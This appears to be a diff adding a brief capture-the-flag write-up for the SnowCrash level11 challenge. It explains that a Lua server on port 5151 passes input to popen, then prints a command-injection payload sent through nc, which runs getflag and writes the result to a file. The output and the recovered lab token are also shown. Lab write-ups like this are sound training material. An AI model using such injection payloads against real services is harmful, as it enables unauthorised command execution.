@@ -1,0 +1,7 @@
+We found a lua script in the home folder, which appears to run a server and listen on port 5151
+It uses a popen with echo and string concatenation, we can simply send a message using nc that will let us run arbitrary shell script
+
+level11@SnowCrash:~$ echo "\"\" ; getflag > /tmp/result ; \#" | nc 127.0.0.1 5151
+Password: Erf nope..
+level11@SnowCrash:~$ cat /tmp/result
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
